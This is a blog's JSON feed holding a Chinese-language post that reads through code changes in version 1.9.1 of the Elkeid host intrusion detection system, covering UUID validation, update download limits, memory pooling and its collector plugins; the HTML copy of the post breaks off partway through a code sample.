{
    "version": "https://jsonfeed.org/version/1",
    "title": "chriskali",
    "home_page_url": "https://chriskalix.github.io/",
    "feed_url": "https://chriskalix.github.io/feed.json",
    "description": "Security engineer.<br> Working on eBPF, Host Intrusion Detection System, WAF, and some Java Security.<br> Language: golang",
    "icon": "https://chriskalix.github.io/apple-touch-icon.png",
    "favicon": "https://chriskalix.github.io/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "chriskali",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://chriskalix.github.io/2022/12/04/dive-into-elkeid-v1-9-1",
            "title": "Elkeid v1.9.1（初步学习版）",
            "summary": "Dive into Elkeid v1.9.1",
            "content_text": "简介前段时间 Elkeid team 更新了 v1.9.1 版本，各个重要组件均有很多的更新，也解决了之前 issue 中很多的问题。我们还是继续学习一下 Elkeid 源码1. Agent  Agent 部分略读，可能有部分没有覆盖到1.1. UUID 计算改动部分主要为：增加了 pdid 的校验if len(source) &gt; 8 &amp;&amp;    string(pdid) != \"03000200-0400-0500-0006-000700080009\" &amp;&amp;    string(pdid) != \"02000100-0300-0400-0005-000600070008\" {    pname, err := fromIDFile(\"/sys/class/dmi/id/product_name\")    if err == nil &amp;&amp; len(pname) != 0 &amp;&amp;        !bytes.Equal(pname, []byte(\"--\")) &amp;&amp;        !bytes.Equal(pname, []byte(\"unknown\")) &amp;&amp;        !bytes.Equal(pname, []byte(\"To be filled by O.E.M.\")) &amp;&amp;        !bytes.Equal(pname, []byte(\"OEM not specify\")) &amp;&amp;        !bytes.Equal(bytes.ToLower(pname), []byte(\"t.b.d\")) {        ID = uuid.NewSHA1(uuid.NameSpaceOID, source).String()    }    return}其中的 pdid 为 /sys/class/dmi/id/product_uuid 中读取。这个 ID 好像在哪里见过，我们看一下 osquery 的源码，就能发现如下：const std::vector&lt;std::string&gt; kPlaceholderHardwareUUIDList{    \"00000000-0000-0000-0000-000000000000\",    \"03000200-0400-0500-0006-000700080009\",    \"03020100-0504-0706-0809-0a0b0c0d0e0f\",    \"10000000-0000-8000-0040-000000000000\",};都有一个类似的白名单，整理一下每个白名单都对应着啥            UUID      Description                  03000200-0400-0500-0006-000700080009      一些主板厂商的默认设置，比如Gigabyte的，同时serial-number 显示为 To be filled by O.E.M.              02000100-0300-0400-0005-000600070008      一些KVM启动的机器会有这个类似的UUID              00000000-0000-0000-0000-000000000000      看起来是 BIOS 设置问题              03020100-0504-0706-0809-0a0b0c0d0e0f      -              10000000-0000-8000-0040-000000000000      -      还有 /sys/class/dmi/id/product_name 这部分的校验，这些我之前没想到过，可能因为我所在公司内部的机器数量较少，基本不会碰到 UUID 冲突的问题。BAD UUID 的case其实还有一些，一些工具会自己维护一份1.2. Agent 自更新更新的部分主要分为 Download、Decompress 以及启动部分，在 Elkeid v1.9.1 中三个部分均有小改动Download 变更  主要包含 client 变更，resp.Body 限制, io.TeeReader 方式优化  Client之前下载超时由一个 subctx 控制，目前是直接采取设置 Client Timeout 的方式，配置如下client := &amp;http.Client{    Transport: &amp;http.Transport{        Dial: (&amp;net.Dialer{            Timeout:   15 * time.Second,            KeepAlive: 30 * time.Second,        }).Dial,        ForceAttemptHTTP2:     true,        MaxIdleConns:          100,        IdleConnTimeout:       90 * time.Second,        TLSHandshakeTimeout:   10 * time.Second,        ExpectContinueTimeout: 1 * time.Second,    },    Timeout: time.Minute * 10,}其中 Transport 的配置和 http.DefaultTransport 相比，应该是只有 Timeout 的部分变短（从 30 -&gt; 15）  resp.Body 限制增加了文件最大读取的 size，应该是防止出现意外下载过大文件，导致所有下发升级的机器磁盘堆满，client side 的安全措施（我猜的）resp.Body = http.MaxBytesReader(nil, resp.Body, 512*1024*1024)  io.TeeReader对比一下之前的方式，Elkeid v1.7.1:buf, err = ioutil.ReadAll(resp.Body)if err != nil {    continue}hasher.Reset()hasher.Write(buf)if !bytes.Equal(hasher.Sum(nil), checksum) {    err = errors.New(\"checksum doesn't match\")    continue} else {    br := bytes.NewBuffer(buf)    switch config.Type {    case \"tar.gz\":        err = DecompressTarGz(dst, br)    default:        err = DecompressDefault(dst, br)    }    break}之前版本，将整个 resp.Body 通过 ioutil.RealAll 的方式读取全部至内存，下发的时候会有一个内存上升的问题，如果连续下发多个还有可能会触发 cgroup 被 kill （因为Hades Agent完全按照Elkeid来，之前有类似的情况）。新版本代码如下：resp.Body = http.MaxBytesReader(nil, resp.Body, 512*1024*1024)hasher.Reset()r := io.TeeReader(resp.Body, hasher)switch config.Type {case \"tar.gz\":    err = DecompressTarGz(r, filepath.Dir(dst))default:    f, err = os.OpenFile(dst, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0o0700)    if err == nil {        _, err = io.Copy(f, r)        f.Close()    }}resp.Body.Close()if err == nil {    if checksum := hex.EncodeToString(hasher.Sum(nil)); checksum != config.Sha256 {        err = fmt.Errorf(\"checksum doesn't match: %s vs %s\", checksum, config.Sha256)    } else {        break    }}io.TeeReader 可以看作是一次优化，不再全部 dump 到内存中，简单写了一个粗糙的 Benchmark 模拟，结果如下goos: linuxgoarch: amd64pkg: agent/utilscpu: Intel(R) Xeon(R) CPU E5-26xx v4BenchmarkDownloadOld-2                 9         118909617 ns/op        81999175 B/op        138 allocs/opBenchmarkDownloadNew-2                15          82094187 ns/op           47442 B/op         93 allocs/opPASSok      agent/utils     3.441s  Decompress新增一个 Limiter, 解压的逻辑部分改动, 不展开说了zr, err := gzip.NewReader(io.LimitReader(r, 512*1024*1024))1.3. sync.Pool 优化之前磊哥提到过这个问题 - Go issue-23199，简单描述为sync.Pool 碰到动态增长的大 buffer 会导致内存无法回收，从而导致无限增长的问题。解决方法就是对 []byte 做分批处理，或者是直接丢弃掉这个 []byte 等着被 GC 掉。下面是 Elkeid 的代码pools = [...]sync.Pool{    {New: func() any {        return &amp;proto.EncodedRecord{            Data: make([]byte, 0, defaultCap),        }    }},    {New: func() any {        return &amp;proto.EncodedRecord{            Data: make([]byte, 0, defaultCap*2),        }    }}, {New: func() any {        return &amp;proto.EncodedRecord{            Data: make([]byte, 0, defaultCap*3),        }    }},    {New: func() any {        return &amp;proto.EncodedRecord{            Data: make([]byte, 0, defaultCap*4),        }    }},}顺便看了一眼好像 zap 下有个类似的 issue1.4. Heartbeat 更新Cpu/Mem 逻辑问题修正，linux 下新增 host_serial、dns、gateway 等1.5. Plugin新增插件名称合法性校验，shutdown 标识位1.6. Agent 状态目前看来暂时只有 running 和 abnormal，应该方便集群主动查询1.7. Main 函数之前通过 DEBUG 来控制 pprof 的方式，现在变更监听 3 个信号1.8. Deploy 部分更新  cgroup 挂载重启失效问题修复 (sysvinit)https://github.com/bytedance/Elkeid/issues/319，将这部分逻辑判断放置 elkeidctl 中了。signal.Notify(sigs, syscall.SIGTERM, syscall.SIGUSR1, syscall.SIGUSR2)相比之前更加灵活了，SIGUSR1 用于 pprof 的启停， SIGUSR2 用于强制触发内存回收2. Collector 插件  Collector 插件本次更新除了增加了容器、fatjar 等，还重构改进了代码结构，逻辑非常清晰，推荐大家仔细阅读，在这里就先不赘述 engine 调度的逻辑了2.1. 新增资产采集app.go 支持了多种应用的采集，包括如下：ruleMap = map[string]*AppRule{    \"apache2\":         apacheRule,    \"httpd\":           apacheRule,    \"nginx\":           nginxRule,    \"redis-server\":    redisRule,    \"rabbitmq-server\": rabbitmqRule,    \"grafana-server\":  grafanaRule,    \"mysqld\":          mysqlRule,    \"postgres\":        postgresqlRule,    \"mongod\":          mongodbRule,    \"etcd\":            etcdRule,    \"prometheus\":      prometheusRule,    \"sqlservr\":        sqlserverRule,    \"php-fpm\":         phpfpmRule,    \"dockerd\":         dockerRule,    \"containerd\":      containerdRule,    \"kubelet\":         kubeletRule,}大致的采集逻辑是循环 /proc/ 目录 pid，从进程的根文件系统 /proc/&lt;pid&gt;/root 去读取上述资产。是一个支持区分容器环境的资产采集2.2. Integrity 采集dpkg / rpm 信息采集，解析还是有一定代码量的，注意里面的 io 限流。跟小黑猪同学沟通，暂时不理解为啥不采集容器内的2.3. Container 采集  一些默认的容器运行时套接字，也是 kubernetes 中的 constantsfor _, path := range []string{    \"unix:///run/containerd/containerd.sock\",    \"unix:///run/crio/crio.sock\",    \"unix:///var/run/cri-dockerd.sock\",} {dockershim 这种应该情况不用再覆盖两种 client 的方式，分别为 criClient 以及 dockerClient。2.4. Process 采集Process 采集和之前版本有较大变动，增加了很多如 namespace, status 详细信息，抽象到结构体函数下，代码比之前清晰了许多2.5. Software 采集Software 主要感兴趣的部分是 Jar 的部分。主要代码在 findJar 部分，根据 Jar 包名称获取 name 以及 sversion，通过在 META-INF/MANIFEST.MF 中读取 Implementation-Version: 来确定 version，这里也是区分容器的2.6. Service 采集Elkeid 中通过遍历解析获取var SearchDir = []string{\t\"/etc/systemd/system.control\", \"/run/systemd/system.control\", \"/run/systemd/transient\",\t\"/run/systemd/generator.early\", \"/etc/systemd/system\", \"/run/systemd/system\",\t\"/run/systemd/generator\", \"/usr/local/lib/systemd/system\", \"/usr/lib/systemd/system\", \"/run/systemd/generator.late\"}在 Osquery 中，好像是 dbus 相关的请求和解析，具体的后面再详细分析3. Baseline还没看……暂时还没写完，只看到 collector 的部分，中间应该也有不对的地方，待我慢慢咀嚼…",
            "content_html": "<h2 id=\"简介\">简介</h2><p>前段时间 Elkeid team 更新了 v1.9.1 版本，各个重要组件均有很多的更新，也解决了之前 issue 中很多的问题。我们还是继续学习一下 Elkeid 源码</p><h2 id=\"1-agent\">1. Agent</h2><blockquote>  <p>Agent 部分略读，可能有部分没有覆盖到</p></blockquote><h3 id=\"11-uuid-计算\">1.1. UUID 计算</h3><p>改动部分主要为：增加了 pdid 的校验</p><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">if</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">source</span><span class=\"p\">)</span> <span class=\"o\">&gt;</span> <span class=\"m\">8</span> <span class=\"o\">&amp;&amp;</span>    <span class=\"kt\">string</span><span class=\"p\">(</span><span class=\"n\">pdid</span><span class=\"p\">)</span> <span class=\"o\">!=</span> <span class=\"s\">\"03000200-0400-0500-0006-000700080009\"</span> <span class=\"o\">&amp;&amp;</span>    <span class=\"kt\">string</span><span class=\"p\">(</span><span class=\"n\">pdid</span><span class=\"p\">)</span> <span class=\"o\">!=</span> <span class=\"s\">\"02000100-0300-0400-0005-000600070008\"</span> <span class=\"p\">{</span>    <span class=\"n\">pname</span><span class=\"p\">,</span> <span class=\"n\">err</span> <span class=\"o\">:=</span> <span class=\"n\">fromIDFile</span><span class=\"p\">(</span><span class=\"s\">\"/sys/class/dmi/id/product_name\"</span><span class=\"p\">)</span>    <span class=\"k\">if</span> <span class=\"n\">err</span> <span class=\"o\">==</span> <span class=\"no\">nil</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">pname</span><span class=\"p\">)</span> <span class=\"o\">!=</span> <span class=\"m\">0</span> <span class=\"o\">&amp;&amp;</span>        <span class=\"o\">!</span><span class=\"n\">bytes</span><span class=\"o\">.</span><span class=\"n\">Equal</span><span class=\"p\">(</span><span class=\"n\">pname</span><span class=\"p\">,</span> <span class=\"p\">[]</span><span class=\"kt\">byte</span><span class=\"p\">(</span><span class=\"s\">\"--\"</span><span class=\"p\">))</span> <span class=\"o\">&amp;&amp;</span>        <span class=\"o\">!</span><span class=\"n\">bytes</span><span class=\"o\">.</span><span class=\"n\">Equal</span><span class=\"p\">(</span><span class=\"n\">pname</span><span class=\"p\">,</span> <span class=\"p\">[]</span><span class=\"kt\">byte</span><span class=\"p\">(</span><span class=\"s\">\"unknown\"</span><span class=\"p\">))</span> <span class=\"o\">&amp;&amp;</span>        <span class=\"o\">!</span><span class=\"n\">bytes</span><span class=\"o\">.</span><span class=\"n\">Equal</span><span class=\"p\">(</span><span class=\"n\">pname</span><span class=\"p\">,</span> <span class=\"p\">[]</span><span class=\"kt\">byte</span><span class=\"p\">(</span><span class=\"s\">\"To be filled by O.E.M.\"</span><span class=\"p\">))</span> <span class=\"o\">&amp;&amp;</span>        <span class=\"o\">!</span><span class=\"n\">bytes</span><span class=\"o\">.</span><span class=\"n\">Equal</span><span class=\"p\">(</span><span class=\"n\">pname</span><span class=\"p\">,</span> <span class=\"p\">[]</span><span class=\"kt\">byte</span><span class=\"p\">(</span><span class=\"s\">\"OEM not specify\"</span><span class=\"p\">))</span> <span class=\"o\">&amp;&amp;</span>        <span class=\"o\">!</span><span class=\"n\">bytes</span><span class=\"o\">.</span><span class=\"n\">Equal</span><span class=\"p\">(</span><span class=\"n\">bytes</span><span class=\"o\">.</span><span class=\"n\">ToLower</span><span class=\"p\">(</span><span class=\"n\">pname</span><span class=\"p\">),</span> <span class=\"p\">[]</span><span class=\"kt\">byte</span><span class=\"p\">(</span><span class=\"s\">\"t.b.d\"</span><span class=\"p\">))</span> <span class=\"p\">{</span>        <span class=\"n\">ID</span> <span class=\"o\">=</span> <span class=\"n\">uuid</span><span class=\"o\">.</span><span class=\"n\">NewSHA1</span><span class=\"p\">(</span><span class=\"n\">uuid</span><span class=\"o\">.</span><span class=\"n\">NameSpaceOID</span><span class=\"p\">,</span> <span class=\"n\">source</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">String</span><span class=\"p\">()</span>    <span class=\"p\">}</span>    <span class=\"k\">return</span><span class=\"p\">}</span></code></pre></div></div><p>其中的 pdid 为 <code class=\"language-plaintext highlighter-rouge\">/sys/class/dmi/id/product_uuid</code> 中读取。这个 ID 好像在哪里见过，我们看一下 osquery 的源码，就能发现如下：</p><div class=\"language-c++ highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">const</span> <span class=\"n\">std</span><span class=\"o\">::</span><span class=\"n\">vector</span><span class=\"o\">&lt;</span><span class=\"n\">std</span><span class=\"o\">::</span><span class=\"n\">string</span><span class=\"o\">&gt;</span> <span class=\"n\">kPlaceholderHardwareUUIDList</span><span class=\"p\">{</span>    <span class=\"s\">\"00000000-0000-0000-0000-000000000000\"</span><span class=\"p\">,</span>    <span class=\"s\">\"03000200-0400-0500-0006-000700080009\"</span><span class=\"p\">,</span>    <span class=\"s\">\"03020100-0504-0706-0809-0a0b0c0d0e0f\"</span><span class=\"p\">,</span>    <span class=\"s\">\"10000000-0000-8000-0040-000000000000\"</span><span class=\"p\">,</span><span class=\"p\">};</span></code></pre></div></div><p>都有一个类似的白名单，整理一下每个白名单都对应着啥</p><table>  <thead>    <tr>      <th style=\"text-align: center\">UUID</th>      <th style=\"text-align: center\">Description</th>    </tr>  </thead>  <tbody>    <tr>      <td style=\"text-align: center\">03000200-0400-0500-0006-000700080009</td>      <td style=\"text-align: center\">一些主板厂商的默认设置，比如Gigabyte的，同时serial-number 显示为 To be filled by O.E.M.</td>    </tr>    <tr>      <td style=\"text-align: center\">02000100-0300-0400-0005-000600070008</td>      <td style=\"text-align: center\">一些KVM启动的机器会有这个类似的UUID</td>    </tr>    <tr>      <td style=\"text-align: center\">00000000-0000-0000-0000-000000000000</td>      <td style=\"text-align: center\">看起来是 BIOS 设置问题</td>    </tr>    <tr>      <td style=\"text-align: center\">03020100-0504-0706-0809-0a0b0c0d0e0f</td>      <td style=\"text-align: center\">-</td>    </tr>    <tr>      <td style=\"text-align: center\">10000000-0000-8000-0040-000000000000</td>      <td style=\"text-align: center\">-</td>    </tr>  </tbody></table><p>还有 <code class=\"language-plaintext highlighter-rouge\">/sys/class/dmi/id/product_name</code> 这部分的校验，这些我之前没想到过，可能因为我所在公司内部的机器数量较少，基本不会碰到 UUID 冲突的问题。BAD UUID 的case其实还有一些，一些工具会自己维护一份</p><h3 id=\"12-agent-自更新\">1.2. Agent 自更新</h3><p>更新的部分主要分为 <code class=\"language-plaintext highlighter-rouge\">Download</code>、<code class=\"language-plaintext highlighter-rouge\">Decompress</code> 以及启动部分，在 Elkeid v1.9.1 中三个部分均有小改动</p><h4 id=\"download-变更\">Download 变更</h4><blockquote>  <p>主要包含 client 变更，resp.Body 限制, io.TeeReader 方式优化</p></blockquote><ul>  <li>Client</li></ul><p>之前下载超时由一个 subctx 控制，目前是直接采取设置 Client Timeout 的方式，配置如下</p><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">client</span> <span class=\"o\">:=</span> <span class=\"o\">&amp;</span><span class=\"n\">http</span><span class=\"o\">.</span><span class=\"n\">Client</span><span class=\"p\">{</span>    <span class=\"n\">Transport</span><span class=\"o\">:</span> <span class=\"o\">&amp;</span><span class=\"n\">http</span><span class=\"o\">.</span><span class=\"n\">Transport</span><span class=\"p\">{</span>        <span class=\"n\">Dial</span><span class=\"o\">:</span> <span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"n\">net</span><span class=\"o\">.</span><span class=\"n\">Dialer</span><span class=\"p\">{</span>            <span class=\"n\">Timeout</span><span class=\"o\">:</span>   <span class=\"m\">15</span> <span class=\"o\">*</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">Second</span><span class=\"p\">,</span>            <span class=\"n\">KeepAlive</span><span class=\"o\">:</span> <span class=\"m\">30</span> <span class=\"o\">*</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">Second</span><span class=\"p\">,</span>        <span class=\"p\">})</span><span class=\"o\">.</span><span class=\"n\">Dial</span><span class=\"p\">,</span>        <span class=\"n\">ForceAttemptHTTP2</span><span class=\"o\">:</span>     <span class=\"no\">true</span><span class=\"p\">,</span>        <span class=\"n\">MaxIdleConns</span><span class=\"o\">:</span>          <span class=\"m\">100</span><span class=\"p\">,</span>        <span class=\"n\">IdleConnTimeout</span><span class=\"o\">:</span>       <span class=\"m\">90</span> <span class=\"o\">*</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">Second</span><span class=\"p\">,</span>        <span class=\"n\">TLSHandshakeTimeout</span><span class=\"o\">:</span>   <span class=\"m\">10</span> <span class=\"o\">*</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">Second</span><span class=\"p\">,</span>        <span class=\"n\">ExpectContinueTimeout</span><span class=\"o\">:</span> <span class=\"m\">1</span> <span class=\"o\">*</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">Second</span><span class=\"p\">,</span>    <span class=\"p\">},</span>    <span class=\"n\">Timeout</span><span class=\"o\">:</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">Minute</span> <span class=\"o\">*</span> <span class=\"m\">10</span><span class=\"p\">,</span><span class=\"p\">}</span></code></pre></div></div><p>其中 <code class=\"language-plaintext highlighter-rouge\">Transport</code> 的配置和 <code class=\"language-plaintext highlighter-rouge\">http.DefaultTransport</code> 相比，应该是只有 Timeout 的部分变短（从 30 -&gt; 15）</p><ul>  <li>resp.Body 限制</li></ul><p>增加了文件最大读取的 size，应该是防止出现意外下载过大文件，导致所有下发升级的机器磁盘堆满，client side 的安全措施（我猜的）</p><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">resp</span><span class=\"o\">.</span><span class=\"n\">Body</span> <span class=\"o\">=</span> <span class=\"n\">http</span><span class=\"o\">.</span><span class=\"n\">MaxBytesReader</span><span class=\"p\">(</span><span class=\"no\">nil</span><span class=\"p\">,</span> <span class=\"n\">resp</span><span class=\"o\">.</span><span class=\"n\">Body</span><span class=\"p\">,</span> <span class=\"m\">512</span><span class=\"o\">*</span><span class=\"m\">1024</span><span class=\"o\">*</span><span class=\"m\">1024</span><span class=\"p\">)</span></code></pre></div></div><ul>  <li>io.TeeReader</li></ul><p>对比一下之前的方式，Elkeid v1.7.1:</p><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">buf</span><span class=\"p\">,</span> <span class=\"n\">err</span> <span class=\"o\">=</span> <span class=\"n\">ioutil</span><span class=\"o\">.</span><span class=\"n\">ReadAll</span><span class=\"p\">(</span><span class=\"n\">resp</span><span class=\"o\">.</span><span class=\"n\">Body</span><span class=\"p\">)</span><span class=\"k\">if</span> <span class=\"n\">err</span> <span class=\"o\">!=</span> <span class=\"no\">nil</span> <span class=\"p\">{</span>    <span class=\"k\">continue</span><span class=\"p\">}</span><span class=\"n\">hasher</span><span class=\"o\">.</span><span class=\"n\">Reset</span><span class=\"p\">()</span><span class=\"n\">hasher</span><span class=\"o\">.</span><span class=\"n\">Write</span><span class=\"p\">(</span><span class=\"n\">buf</span><span class=\"p\">)</span><span class=\"k\">if</span> <span class=\"o\">!</span><span class=\"n\">bytes</span><span class=\"o\">.</span><span class=\"n\">Equal</span><span class=\"p\">(</span><span class=\"n\">hasher</span><span class=\"o\">.</span><span class=\"n\">Sum</span><span class=\"p\">(</span><span class=\"no\">nil</span><span class=\"p\">),</span> <span class=\"n\">checksum</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"n\">err</span> <span class=\"o\">=</span> <span class=\"n\">errors</span><span class=\"o\">.</span><span class=\"n\">New</span><span class=\"p\">(</span><span class=\"s\">\"checksum doesn't match\"</span><span class=\"p\">)</span>    <span class=\"k\">continue</span><span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>    <span class=\"n\">br</span> <span class=\"o\">:=</span> <span class=\"n\">bytes</span><span class=\"o\">.</span><span class=\"n\">NewBuffer</span><span class=\"p\">(</span><span class=\"n\">buf</span><span class=\"p\">)</span>    <span class=\"k\">switch</span> <span class=\"n\">config</span><span class=\"o\">.</span><span class=\"n\">Type</span> <span class=\"p\">{</span>    <span class=\"k\">case</span> <span class=\"s\">\"tar.gz\"</span><span class=\"o\">:</span>        <span class=\"n\">err</span> <span class=\"o\">=</span> <span class=\"n\">DecompressTarGz</span><span class=\"p\">(</span><span class=\"n\">dst</span><span class=\"p\">,</span> <span class=\"n\">br</span><span class=\"p\">)</span>    <span class=\"k\">default</span><span class=\"o\">:</span>        <span class=\"n\">err</span> <span class=\"o\">=</span> <span class=\"n\">DecompressDefault</span><span class=\"p\">(</span><span class=\"n\">dst</span><span class=\"p\">,</span> <span class=\"n\">br</span><span class=\"p\">)</span>    <span class=\"p\">}</span>    <span class=\"k\">break</span><span class=\"p\">}</span></code></pre></div></div><p>之前版本，将整个 resp.Body 通过 <code class=\"language-plaintext highlighter-rouge\">ioutil.RealAll</code> 的方式读取全部至内存，下发的时候会有一个内存上升的问题，如果连续下发多个还有可能会触发 cgroup 被 kill （因为Hades Agent完全按照Elkeid来，之前有类似的情况）。新版本代码如下：</p><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">resp</span><span class=\"o\">.</span><span class=\"n\">Body</span> <span class=\"o\">=</span> <span class=\"n\">http</span><span class=\"o\">.</span><span class=\"n\">MaxBytesReader</span><span class=\"p\">(</span><span class=\"no\">nil</span><span class=\"p\">,</span> <span class=\"n\">resp</span><span class=\"o\">.</span><span class=\"n\">Body</span><span class=\"p\">,</span> <span class=\"m\">512</span><span class=\"o\">*</span><span class=\"m\">1024</span><span class=\"o\">*</span><span class=\"m\">1024</span><span class=\"p\">)</span><span class=\"n\">hasher</span><span class=\"o\">.</span><span class=\"n\">Reset</span><span class=\"p\">()</span><span class=\"n\">r</span> <span class=\"o\">:=</span> <span class=\"n\">io</span><span class=\"o\">.</span><span class=\"n\">TeeReader</span><span class=\"p\">(</span><span class=\"n\">resp</span><span class=\"o\">.</span><span class=\"n\">Body</span><span class=\"p\">,</span> <span class=\"n\">hasher</span><span class=\"p\">)</span><span class=\"k\">switch</span> <span class=\"n\">config</span><span class=\"o\">.</span><span class=\"n\">Type</span> <span class=\"p\">{</span><span class=\"k\">case</span> <span class=\"s\">\"tar.gz\"</span><span class=\"o\">:</span>    <span class=\"n\">err</span> <span class=\"o\">=</span> <span class=\"n\">DecompressTarGz</span><span class=\"p\">(</span><span class=\"n\">r</span><span class=\"p\">,</span> <span class=\"n\">filepath</span><span class=\"o\">.</span><span class=\"n\">Dir</span><span class=\"p\">(</span><span class=\"n\">dst</span><span class=\"p\">))</span><span class=\"k\">default</span><span class=\"o\">:</span>    <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">err</span> <span class=\"o\">=</span> <span class=\"n\">os</span><span class=\"o\">.</span><span class=\"n\">OpenFile</span><span class=\"p\">(</span><span class=\"n\">dst</span><span class=\"p\">,</span> <span class=\"n\">os</span><span class=\"o\">.</span><span class=\"n\">O_CREATE</span><span class=\"o\">|</span><span class=\"n\">os</span><span class=\"o\">.</span><span class=\"n\">O_RDWR</span><span class=\"o\">|</span><span class=\"n\">os</span><span class=\"o\">.</span><span class=\"n\">O_TRUNC</span><span class=\"p\">,</span> <span class=\"m\">0</span><span class=\"n\">o0700</span><span class=\"p\">)</span>    <span class=\"k\">if</span> <span class=\"n\">err</span> <span class=\"o\">==</span> <span class=\"no\">nil</span> <span class=\"p\">{</span>        <span class=\"n\">_</span><span class=\"p\">,</span> <span class=\"n\">err</span> <span class=\"o\">=</span> <span class=\"n\">io</span><span class=\"o\">.</span><span class=\"n\">Copy</span><span class=\"p\">(</span><span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">r</span><span class=\"p\">)</span>        <span class=\"n\">f</span><span class=\"o\">.</span><span class=\"n\">Close</span><span class=\"p\">()</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"n\">resp</span><span class=\"o\">.</span><span class=\"n\">Body</span><span class=\"o\">.</span><span class=\"n\">Close</span><span class=\"p\">()</span><span class=\"k\">if</span> <span class=\"n\">err</span> <span class=\"o\">==</span> <span class=\"no\">nil</span> <span class=\"p\">{</span>    <span class=\"k\">if</span> <span class=\"n\">checksum</span> <span class=\"o\">:=</span> <span class=\"n\">hex</span><span class=\"o\">.</span><span class=\"n\">EncodeToString</span><span class=\"p\">(</span><span class=\"n\">hasher</span><span class=\"o\">.</span><span class=\"n\">Sum</span><span class=\"p\">(</span><span class=\"no\">nil</span><span class=\"p\">));</span> <span class=\"n\">checksum</span> <span class=\"o\">!=</span> <span class=\"n\">config</span><span class=\"o\">.</span><span class=\"n\">Sha256</span> <span class=\"p\">{</span>        <span class=\"n\">err</span> <span class=\"o\">=</span> <span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Errorf</span><span class=\"p\">(</span><span class=\"s\">\"checksum doesn't match: %s vs %s\"</span><span class=\"p\">,</span> <span class=\"n\">checksum</span><span class=\"p\">,</span> <span class=\"n\">config</span><span class=\"o\">.</span><span class=\"n\">Sha256</span><span class=\"p\">)</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>        <span class=\"k\">break</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>io.TeeReader 可以看作是一次优化，不再全部 dump 到内存中，简单写了一个粗糙的 Benchmark 模拟，结果如下</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>goos: linuxgoarch: amd64pkg: agent/utilscpu: Intel(R) Xeon(R) CPU E5-26xx v4BenchmarkDownloadOld-2                 9         118909617 ns/op        81999175 B/op        138 allocs/opBenchmarkDownloadNew-2                15          82094187 ns/op           47442 B/op         93 allocs/opPASSok      agent/utils     3.441s</code></pre></div></div><ul>  <li>Decompress</li></ul><p>新增一个 Limiter, 解压的逻辑部分改动, 不展开说了</p><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">zr</span><span class=\"p\">,</span> <span class=\"n\">err</span> <span class=\"o\">:=</span> <span class=\"n\">gzip</span><span class=\"o\">.</span><span class=\"n\">NewReader</span><span class=\"p\">(</span><span class=\"n\">io</span><span class=\"o\">.</span><span class=\"n\">LimitReader</span><span class=\"p\">(</span><span class=\"n\">r</span><span class=\"p\">,</span> <span class=\"m\">512</span><span class=\"o\">*</span><span class=\"m\">1024</span><span class=\"o\">*</span><span class=\"m\">1024</span><span class=\"p\">))</span></code></pre></div></div><h3 id=\"13-syncpool-优化\">1.3. sync.Pool 优化</h3><p>之前磊哥提到过这个问题 - <a href=\"https://github.com/golang/go/issues/23199\">Go issue-23199</a>，简单描述为sync.Pool 碰到动态增长的大 buffer 会导致内存无法回收，从而导致无限增长的问题。解决方法就是对 []byte 做分批处理，或者是直接丢弃掉这个 []byte 等着被 GC 掉。下面是 Elkeid 的代码</p><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">pools</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"o\">...</span><span class=\"p\">]</span><span class=\"n\">sync</span><span class=\"o\">.</span><span class=\"n\">Pool</span><span class=\"p\">{</span>    <span class=\"p\">{</span><span class=\"n\">New</span><span class=\"o\">:</span> <span class=\"k\">func</span><span class=\"p\">()</span> <span class=\"n\">any</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"o\">&amp;</span><span class=\"n\">proto</span><span class=\"o\">.</span><span class=\"n\">EncodedRecord</span><span class=\"p\">{</span>            <span class=\"n\">Data</span><span class=\"o\">:</span> <span class=\"nb\">make</span><span class=\"p\">([]</span><span class=\"kt\">byte</span><span class=\"p\">,</span> <span class=\"m\">0</span><span class=\"p\">,</span> <span class=\"n\">defaultCap</span><span class=\"p\">),</span>        <span class=\"p\">}</span>    <span class=\"p\">}},</span>    <span class=\"p\">{</span><span class=\"n\">New</span><span class=\"o\">:</span> <span class=\"k\">func</span><span class=\"p\">()</span> <span class=\"n\">any</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"o\">&amp;</span><span class=\"n\">proto</span><span class=\"o\">.</span><span class=\"n\">EncodedRecord</span><span class=\"p\">{</span>            <span 